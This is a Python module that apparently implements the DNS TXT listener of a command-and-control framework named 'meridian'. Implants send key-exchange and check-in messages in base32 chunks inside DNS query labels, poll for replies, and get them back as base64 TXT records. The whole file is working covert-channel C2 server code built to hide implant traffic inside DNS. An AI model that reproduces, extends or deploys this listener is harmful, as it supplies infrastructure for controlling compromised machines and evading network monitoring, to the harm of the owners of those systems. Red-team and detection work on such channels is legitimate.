"""DNS TXT listener (dnslib) with multi-query chunked messaging.

DNS is case-insensitive, so message payloads use UPPERCASE base32 (RFC 4648).
Messages too large for one name are split into fixed-size chunks, each sent as
its own TXT query; the server reassembles them and the implant polls for the
response (see docs/protocol.md section 6).

Query format (all against `<base>`):

    ping.<base>                           -> TXT "pong"
    uk.<msgid>.<seq>.<b32>.<base>         -> KEX upload chunk
    uc.<msgid>.<seq>.<b32>.<base>         -> checkin upload chunk
    g.<msgid>.<base>                      -> poll for response ("P" while pending)

    msgid: 8-hex unique per message; seq: decimal chunk index; a chunk shorter
    than CHUNK_SIZE marks the last chunk.

Replies: `ok` while buffering, or TXT records `00:{total}:{chunk}` /
`NN:{chunk}` once the response is ready.
"""

from __future__ import annotations

import base64
import logging
import threading
import time

from dnslib import QTYPE, RR, TXT, DNSRecord
from dnslib.server import DNSServer

from ..crypto import CryptoError
from .base import Listener

log = logging.getLogger("meridian.listener")

CHUNK = 180  # base64 chars per TXT record (response chunking)
LABEL = 60  # max base32 chars per label
CHUNK_SIZE = 36  # payload bytes per upload query (36B -> 58 base32 chars)
BUFFER_TTL = 45  # seconds a buffered message/response survives


def _b32e(payload: bytes) -> str:
    return base64.b32encode(payload).decode().rstrip("=")


def _b32d(text: str) -> bytes:
    text = text.upper()
    pad = "=" * (-len(text) % 8)
    return base64.b32decode(text + pad)


def _b64_chunks(data: bytes) -> list[str]:
    s = base64.b64encode(data).decode()
    return [s[i : i + CHUNK] for i in range(0, len(s), CHUNK)] or [""]


def _reply_records(data: bytes) -> list[str]:
    chunks = _b64_chunks(data)
    total = len(chunks)
    out = []
    for i, c in enumerate(chunks):
        out.append(f"{i:02d}:{total}:{c}" if i == 0 else f"{i:02d}:{c}")
    return out


class MeridianResolver:
    def __init__(self, listener: DnsListener):
        self.l = listener
        self.base = listener.cfg.domain.rstrip(".")
        self._lock = threading.Lock()
        # msgid -> {"chunks": {seq: bytes}, "done": bool, "resp": bytes|None, "t": float}
        self._msgs: dict[str, dict] = {}

    def _reply_txt(self, request: DNSRecord, records: list[str]) -> DNSRecord:
        reply = request.reply()
        for txt in records:
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(txt)))
        return reply

    def resolve(self, request: DNSRecord, handler) -> DNSRecord:
        try:
            qname = str(request.q.qname).rstrip(".").lower()
            labels = qname.split(".")
            base_labels = self.base.split(".")
            if labels[-len(base_labels) :] != base_labels:
                return self._reply_txt(request, ["err"])
            sub = labels[: -len(base_labels)]
            if not sub:
                return self._reply_txt(request, ["err"])
            marker = sub[0]
            if marker == "ping":
                return self._reply_txt(request, ["pong"])
            if marker in ("uk", "uc"):
                return self._on_upload(marker, sub[1:], request)
            if marker == "g":
                return self._on_poll(sub[1], request)
            return self._reply_txt(request, ["err"])
        except CryptoError:
            return self._reply_txt(request, ["err"])
        except Exception as exc:
            log.debug("dns resolve error: %s", exc)
            return self._reply_txt(request, ["err"])

    # ------------------------------------------------------------- upload
    def _on_upload(self, marker: str, parts: list[str], request: DNSRecord) -> DNSRecord:
        if len(parts) < 3:
            return self._reply_txt(request, ["err"])
        msgid = parts[0]
        seq = int(parts[1])
        chunk = _b32d("".join(parts[2:]))
        with self._lock:
            self._purge_locked()
            state = self._msgs.setdefault(msgid, {"chunks": {}, "resp": None, "t": time.time()})
            state["t"] = time.time()
            state["chunks"][seq] = chunk
            if len(chunk) < CHUNK_SIZE or seq == 999:
                state["done"] = True
            if state.get("resp") is None and state.get("done") and self._complete(state):
                try:
                    payload = self._assemble(state)
                    state["resp"] = self.l.dispatch(marker, msgid, payload)
                except CryptoError:
                    return self._reply_txt(request, ["err"])
                except Exception as exc:
                    log.debug("dns dispatch failed: %s", exc)
                    return self._reply_txt(request, ["err"])
        return self._reply_txt(request, ["ok"])

    def _complete(self, state: dict) -> bool:
        seqs = state["chunks"]
        if not seqs:
            return False
        last = max(seqs)
        return all(i in seqs for i in range(last + 1))

    def _assemble(self, state: dict) -> bytes:
        seqs = state["chunks"]
        return b"".join(seqs[i] for i in range(max(seqs) + 1))

    # -------------------------------------------------------------- poll
    def _on_poll(self, msgid: str, request: DNSRecord) -> DNSRecord:
        with self._lock:
            state = self._msgs.get(msgid)
            if state is None or state["resp"] is None:
                return self._reply_txt(request, ["P"])
            records = _reply_records(state["resp"])
            del self._msgs[msgid]
            return self._reply_txt(request, records)

    def _purge_locked(self) -> None:
        now = time.time()
        dead = [k for k, s in self._msgs.items() if now - s["t"] > BUFFER_TTL]
        for k in dead:
            del self._msgs[k]


class DnsListener(Listener):
    name = "dns"
    transport = "dns"

    def __init__(self, app, cfg):
        super().__init__(app, cfg)
        self._server: DNSServer | None = None

    def dispatch(self, marker: str, msgid: str, payload: bytes) -> bytes:
        """Dispatch an assembled message; returns the response frame."""
        if marker == "uk":
            return self.handle_dns_kex(payload)
        if marker == "uc":
            return self.handle_dns_checkin(msgid, payload)
        raise CryptoError("unknown message type")

    def _run(self) -> None:
        resolver = MeridianResolver(self)
        self._server = DNSServer(resolver, port=self.cfg.port, address=self.cfg.host)
        self._server.start_thread()
        while self.running:
            time.sleep(0.5)
